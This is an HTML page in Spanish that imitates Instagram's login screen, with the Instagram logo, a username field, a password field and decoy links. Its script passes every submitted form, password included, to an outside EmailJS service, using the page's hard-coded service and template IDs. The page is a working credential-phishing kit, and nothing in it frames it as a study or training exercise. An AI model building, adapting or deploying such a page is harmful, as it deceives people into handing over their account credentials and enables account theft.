<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Iniciar sesión - Instagram</title>
  <link rel="stylesheet" href="styles.css" />
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("FL6vofHg7F9vLawQs");
    })();
  </script>
</head>
<body>
  <div class="login-container">
    <form id="login-form">
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram Logo" class="logo" />
      <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required />
      <input type="password" name="password" placeholder="Contraseña" required />
      <button type="submit">Iniciar sesión</button>
      <div class="separator"><span>O</span></div>
      <a href="#" class="facebook-login">Iniciar sesión con Facebook</a>
      <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
    </form>
    <div class="signup-box">
      ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>
  </div>

  <script>
    document.getElementById("login-form").addEventListener("submit", function(e) {
      e.preventDefault();
      emailjs.sendForm('service_6pbv86h', 'template_z1nimz6', this)
        .then(function() {
          alert("Formulario enviado correctamente.");
        }, function(error) {
          alert("Error al enviar el formulario: " + JSON.stringify(error));
        });
    });
  </script>
</body>
</html>
